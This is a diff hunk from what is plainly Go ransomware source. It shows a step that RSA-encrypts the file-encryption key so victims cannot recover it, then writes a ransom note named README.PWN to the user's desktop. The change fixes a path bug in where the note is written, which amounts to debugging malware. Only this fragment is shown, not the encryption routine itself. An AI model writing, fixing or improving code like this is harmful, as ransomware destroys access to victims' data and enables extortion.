@@ -110,7 +110,7 @@ gwIDAQAB
 	// Encrypt the key so that it can't be reversed.
 	EncryptionKey = EncryptDataRSA(publicRSAKey, EncryptionKey)
 	ransomBytes := []byte(ransomNoteMsg + getEncryptedKey())
-	WriteToFile(os.Getenv("USERPROFILE")+"DESKTOP\\README.PWN", ransomBytes)
+	WriteToFile(os.Getenv("USERPROFILE")+"\\DESKTOP\\README.PWN", ransomBytes)
 
 	// Append the key
 	for _, f := range files {
